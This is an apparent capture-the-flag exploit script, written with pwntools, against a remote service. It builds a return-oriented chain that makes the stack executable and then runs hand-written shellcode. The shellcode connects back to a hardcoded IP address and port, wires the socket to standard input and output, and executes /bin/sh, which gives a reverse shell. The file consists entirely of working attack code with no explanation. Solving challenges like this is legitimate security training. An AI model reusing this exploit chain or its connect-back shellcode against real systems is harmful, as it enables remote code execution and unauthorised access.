#!/usr/bin/env python
from pwn import *

# 

host , port = 'ctf.yuawn.idv.tw' , 10205
y = remote( host , port )


context.arch = 'amd64'

pop_rdi = 0x4014c6
pop_rsi = 0x4015e7
jmp_rsp = 0x4a369f 
__libc_stack_end = 0x6c9f90
__stack_prot = 0x6c9fe0
_dl_make_stack_executable = 0x474680
mov_rdi_rsi = 0x47a302


p = flat(
    'D' * 0x18,
    pop_rdi,
    __stack_prot,
    pop_rsi,
    0x7,
    mov_rdi_rsi,
    pop_rdi,
    __libc_stack_end,
    _dl_make_stack_executable,
    jmp_rsp
)

_conn = '''
    /* call socket(2, Constant('SOCK_STREAM', 0x1), 0) */
    push SYS_socket /* 0x29 */
    pop rax
    push 2
    pop rdi
    push SOCK_STREAM /* 1 */
    pop rsi
    cdq /* rdx=0 */
    syscall

    mov rdi, rax

    /* Create address structure on stack */
    mov rax, 0x11ecfb3c39050002
    push rax

    /* Connect the socket */
    /* call connect('rbp', 'rsp', 16) */
    push (SYS_connect) /* 0x2a */
    pop rax
    push 0x10
    pop rdx
    mov rsi, rsp
    syscall
'''

_sh = '''
xor esi, esi
xor edx, edx
mov rax, 0x68732f6e69622f
push rax
push 0x3b
pop rax
mov rdi, rsp
syscall
'''

_asm = _conn
_asm += shellcraft.dup2(0 , 1)
_asm += _sh

p += asm( _asm )

print len( p )

sleep(1)

y.send( p )

y.interactive()